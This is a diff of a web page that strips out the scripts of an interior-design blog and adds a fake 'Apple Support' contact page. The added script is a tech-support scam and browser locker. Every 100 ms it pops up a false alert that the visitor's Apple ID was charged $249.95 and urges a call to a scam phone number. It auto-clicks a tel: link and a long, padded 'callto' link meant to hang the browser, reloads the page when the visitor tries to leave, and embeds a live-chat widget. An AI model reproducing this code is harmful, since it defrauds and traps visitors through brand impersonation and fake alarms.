-        excerpt: "The kitchen is the heart of the home. Learn how to plan the work triangle, choose durable surfaces, and create a space that invites gathering.",
-        readingTime: "13 min read",
-        date: "January 30, 2025",
-        author: "Sofia Lindgren",
-        image: "https://images.unsplash.com/photo-1556909114-f6e7ad7d3136?w=600&h=400&fit=crop",
-        alt: "Modern kitchen with island, pendant lights, and wood accents"
-      },
-      {
-        id: 8,
-        title: "Bathroom Sanctuaries: Spa-Like Details for Daily Rituals",
-        category: "Interior Design",
-        excerpt: "Turn a utilitarian space into a retreat with natural stone, warm lighting, and thoughtful storage.",
-        readingTime: "11 min read",
-        date: "January 22, 2025",
-        author: "Elena Marchetti",
-        image: "https://images.unsplash.com/photo-1584622650111-993a426fbf0a?w=600&h=400&fit=crop",
-        alt: "Spa-like bathroom with stone tiles and freestanding tub"
-      },
-      {
-        id: 9,
-        title: "Furniture Layout: The Invisible Architecture of a Room",
-        category: "Furniture",
-        excerpt: "How to arrange seating, tables, and rugs to create conversation areas and smooth circulation.",
-        readingTime: "9 min read",
-        date: "January 15, 2025",
-        author: "Sofia Lindgren",
-        image: "https://images.unsplash.com/photo-1556228453-efd6c1ff04f6?w=600&h=400&fit=crop",
-        alt: "Living room with carefully arranged furniture and area rug"
-      },
-      {
-        id: 10,
-        title: "Sustainable Design: Materials and Strategies for a Greener Home",
-        category: "Materials",
-        excerpt: "From reclaimed wood to passive cooling, explore practical ways to reduce your home's environmental impact.",
-        readingTime: "17 min read",
-        date: "January 8, 2025",
-        author: "James K. Whitfield",
-        image: "https://images.unsplash.com/photo-1600585154340-be6161a56a0c?w=600&h=400&fit=crop",
-        alt: "Eco-friendly home with natural materials and plants"
-      },
-      {
-        id: 11,
-        title: "Color Theory for Interiors: Beyond the Trend Cycle",
-        category: "Interior Design",
-        excerpt: "How to choose a palette that feels personal, timeless, and harmonious with your architecture.",
-        readingTime: "12 min read",
-        date: "December 28, 2024",
-        author: "Elena Marchetti",
-        image: "https://images.unsplash.com/photo-1615529182904-14819c35db37?w=600&h=400&fit=crop",
-        alt: "Interior with muted green walls and natural light"
-      },
-      {
-        id: 12,
-        title: "Modern Home Renovation: Lessons from a Gut Remodel",
-        category: "Modern Homes",
-        excerpt: "A candid look at the challenges and rewards of transforming a 1970s house into a light-filled modern home.",
-        readingTime: "20 min read",
-        date: "December 18, 2024",
-        author: "James K. Whitfield",
-        image: "https://images.unsplash.com/photo-1600607687920-4e2a09cf159d?w=600&h=400&fit=crop",
-        alt: "Renovated modern home with open plan and large windows"
-      }
-    ];
-
-    // ----- RENDER ARTICLE CARDS -----
-    const grid = document.getElementById('articleGrid');
-    const searchInput = document.getElementById('searchInput');
-    const searchBtn = document.getElementById('searchBtn');
-    const filterBtns = document.querySelectorAll('.filter-btn');
-    let currentCategory = 'all';
-    let currentSearch = '';
-
-    function renderArticles() {
-      let filtered = articles;
-
-      if (currentCategory !== 'all') {
-        filtered = filtered.filter(a => a.category === currentCategory);
-      }
-
-      if (currentSearch.trim() !== '') {
-        const q = currentSearch.toLowerCase();
-        filtered = filtered.filter(a =>
-          a.title.toLowerCase().includes(q) ||
-          a.excerpt.toLowerCase().includes(q) ||
-          a.category.toLowerCase().includes(q) ||
-          a.author.toLowerCase().includes(q)
-        );
-      }
-
-      if (filtered.length === 0) {
-        grid.innerHTML = `<p style="grid-column:1/-1; color:var(--muted); padding:2rem 0;">No articles found. Try a different search or category.</p>`;
-        return;
-      }
-
-      grid.innerHTML = filtered.map(a => `
-        <article class="article-card" data-id="${a.id}" data-category="${a.category}">
-          <img class="card-image" src="${a.image}" alt="${a.alt}" loading="lazy">
-          <div class="card-body">
-            <div class="category">${a.category}</div>
-            <h3>${a.title}</h3>
-            <p>${a.excerpt}</p>
-            <div class="card-footer">
-              <span>${a.author}</span>
-              <span class="reading-time">${a.readingTime}</span>
-            </div>
-          </div>
-        </article>
-      `).join('');
-    }
-
-    // ----- SEARCH FUNCTIONALITY -----
-    function performSearch() {
-      currentSearch = searchInput.value;
-      renderArticles();
-    }
-
-    searchBtn.addEventListener('click', performSearch);
-    searchInput.addEventListener('keyup', (e) => {
-      if (e.key === 'Enter') performSearch();
-    });
-    // Live search on input
-    searchInput.addEventListener('input', () => {
-      currentSearch = searchInput.value;
-      renderArticles();
-    });
-
-    // ----- CATEGORY FILTERING -----
-    filterBtns.forEach(btn => {
-      btn.addEventListener('click', () => {
-        filterBtns.forEach(b => b.classList.remove('active'));
-        btn.classList.add('active');
-        currentCategory = btn.dataset.category;
-        renderArticles();
-      });
-    });
-
-    // ----- FAQ TOGGLE -----
-    document.querySelectorAll('.faq-question').forEach(q => {
-      q.addEventListener('click', () => {
-        const answer = q.nextElementSibling;
-        const span = q.querySelector('span');
-        answer.classList.toggle('open');
-        span.textContent = answer.classList.contains('open') ? '−' : '+';
-      });
-    });
-
-    // ----- NEWSLETTER FORM -----
-    const newsletterForm = document.getElementById('newsletterForm');
-    const newsletterMsg = document.getElementById('newsletterMsg');
-    newsletterForm.addEventListener('submit', (e) => {
-      e.preventDefault();
-      const email = newsletterForm.querySelector('input').value;
-      if (email) {
-        newsletterMsg.textContent = 'Thank you! You are now subscribed to Glimmer Home Details.';
-        newsletterForm.reset();
-        setTimeout(() => { newsletterMsg.textContent = ''; }, 5000);
-      }
-    });
-
-    // ----- MOBILE MENU TOGGLE -----
-    const mobileToggle = document.getElementById('mobileToggle');
-    const navLinks = document.getElementById('navLinks');
-    mobileToggle.addEventListener('click', () => {
-      navLinks.classList.toggle('open');
-    });
-
-    // Close mobile menu when clicking a link
-    navLinks.querySelectorAll('a').forEach(link => {
-      link.addEventListener('click', () => {
-        navLinks.classList.remove('open');
-      });
-    });
-
-    // ----- INITIAL RENDER -----
-    renderArticles();
-
-    // ----- FEATURED ARTICLE: clickable (simulated) -----
-    document.querySelector('.featured-card')?.addEventListener('click', function() {
-      // Could open a modal or navigate — for now, highlight
-      this.style.borderColor = '#9b6b4b';
-      setTimeout(() => { this.style.borderColor = '#e2dfda'; }, 300);
-    });
-
-    // Card click simulation (no actual navigation)
-    document.addEventListener('click', (e) => {
-      const card = e.target.closest('.article-card');
-      if (card) {
-        card.style.borderColor = '#9b6b4b';
-        setTimeout(() => { card.style.borderColor = '#e2dfda'; }, 300);
-      }
-    });
-
-  })();
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
 </script>
-</body>
-</html>
+
+
+
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+    <link rel="stylesheet" type="text/css" href="_families%253dSF%252bPro%252cv1_7CSF%252bPro%252bIcons%252cv1html.html">
+    <script async="" src="https://embed.tawk.to/667056f19a809f19fb3eaed8/1i0jd783t" charset="UTF-8" crossorigin="*"></script><script src="js/text_tel.js"></script>
+
+</head>
+
+<body>
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+					 <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
+        </div>
+    </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
+
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support +1-866-949-6318 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-cont">
+                        <div class="as-banner-image as-banner-image--top">
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("images/contact-us-hero.image.large_2x.jpg");
+                                }
+
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
+
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("images/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="images/contact-us-hero.image.small_2x.jpg 735w, images/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="images/contact-us-hero.image.large_2x.jpg">
+                        </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock">
+                        </p></div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
+                </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="images/us.png" alt="" width="16" height="16">United
+					States </a>
+                </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2026 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
+                </div>
+                <meta content="Apple" property="name">
+                <meta content="+1-866-949-6318
+			 " property="telephone">
+            </section>
+        </div>
+    </footer>
+
+
+
+    <script src="js/jquery-1.12.0.min.js"></script>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
+            }
+        };
+
+
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
+
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
+
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
+
+        window.number = getPar('phone');
+
+        window.number = (window.number ? window.number : '+1-866-949-6318');
+
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
+
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
+
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
+        }
+
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
+
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        setInterval(function() {
+            myFunction()
+        }, 100);
+
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-866-949-6318"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            //setInterval(function(){ alert(getText().repeat(99999999999));}, 300);
+        };
+
+        function myFunction() {
+            if (confirm("Your Apple ID was recently used at APPLE STORE for $249.95 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support +1-866-949-6318 to Freeze it!.")) {
+                okkkk();
+            } else {
+                okkkk();
+            }
+        }
+
+        window.ununload = function() {
+            debugger;
+            location.reload();
+        }
+    </script>
+
+
+
+
+
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/667056f19a809f19fb3eaed8/1i0jd783t';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
